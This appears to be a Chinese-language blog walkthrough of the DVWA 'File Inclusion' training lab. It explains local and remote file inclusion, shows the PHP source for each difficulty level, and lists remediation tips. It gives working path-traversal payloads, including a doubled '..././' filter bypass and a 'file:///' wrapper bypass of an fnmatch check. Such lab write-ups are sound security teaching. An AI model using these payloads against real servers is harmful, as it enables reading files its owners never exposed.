---
title: "网络安全 DVWA通关指南 DVWA File Inclusion（文件包含）"
date: 2024-09-26 12:23:22
category: "DVWA靶场"
categories: 
  - "DVWA靶场"
tags:
- "web安全"
- "安全"
- "网络安全"
- "DVWA"
- "靶场"
- "渗透测试"
---



## DVWA File Inclusion（文件包含）

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165312280.jpeg)





---

参考文献

- [WEB 安全靶场通关指南](https://www.cnblogs.com/linfangnan/p/13994655.html#dvwa-%E9%9D%B6%E5%9C%BA)



---

> ### 本地文件包含(LFI)
> 
> 文件包含漏洞的产生原因是 PHP 语言在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。
> 
> 当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。
> 
> #### 漏洞利用
> 
> **利用条件：** 
> 
> > （1）include()等函数通过动态变量的方式引入包含文件； （2）用户能够控制该动态变量。
> 
> ### 远程文件包含(RFL)
> 
> 服务器通过 PHP 的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，
> 
> 从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。
> 
> #### 漏洞利用
> 
> **条件：** `php.ini` 中开启 `allow_url_include` 、 `allow_url_fopen` 选项。
> 
> ### 修复建议
> 
> > 
> > 
> > 1. 禁止远程文件包含 `allow_url_include=off`
> > 
> > 2. 配置 `open_basedir=指定目录` ，限制访问区域。
> > 
> > 3. 过滤 `../` 等特殊符号
> > 
> > 4. 修改Apache日志文件的存放地址
> > 
> > 5. 开启魔术引号 `magic_quotes_qpc=on`
> > 
> > 6. 尽量不要使用动态变量调用文件，直接写要包含的文件。
> > 
> > 
> 
> 

## Low

1、分析网页源代码

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>
```

没有任何过滤措施存在，同时使用GET方法传递参数。尝试查看file1.php文件

 ![image-20240517101641776](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165312282.png)

2、在URL输入不存在的路径，提交出现报错信息，得到文件的绝对路径

```
Warning: include(iviirjgiegij): failed to open stream: No such file or directory in D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php on line 36

Warning: include(): Failed opening 'iviirjgiegij' for inclusion (include_path='.;C:\php\pear;../../external/phpids/0.6/lib/') in D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php on line 36
```

 ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165312283.png)

3、使用相对路径访问fi.php，路径为D:\phpstudy_pro\WWW\DVWA-master\hackable\flags\fi.php。

相对路径计算如下：

```
..\..\hackable\flags\fi.php
```

成功访问到fi.php文件

 ![image-20240517102538336](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165312284.png)

## Medium

1、分析网页源代码

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
// 使用str_replace函数移除$file字符串中所有的"http://"和"https://"子串。
$file = str_replace( array( "../", "..\"" ), "", $file );
// 继续使用str_replace函数，这次移除$file中所有向上一级目录的路径指示符，无论是"../"还是"..\"（考虑到不同操作系统的路径分隔符）。

?>
```

2、使用str_replace函数对输入的文件路径进行过滤，因为使用的是str_replace函数，所以可以使用双写绕过。构造Payload如下：

```
..././..././hackable/flags/fi.php
```

拼接到URL中提交，绕过成功

 ![image-20240517103347816](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165312285.png)

## High

1、分析网页源代码

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
// 使用fnmatch函数检查$file是否匹配模式"file*"
// fnmatch用于实现shell风格的通配符匹配，这里的"file*"会匹配以"file"开头的任何字符串。
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
```

2、使用fnmatch函数函数，虽然只能包含"file"开头的文件，但我们可以使用file伪协议读取到文件。（这个地方需要文件的绝对路径，与Low级别不同，这里的报错信息需要提交以file开头的不存在文件或路径，否则会返回统一错误页面）

构造Payload如下：

```
file:///D:\phpstudy_pro\WWW\DVWA-master\hackable\flags\fi.php
```

拼接到URL中提交，包含文件成功

 ![image-20240517104929712](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165312286.png)

## Impossible

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
```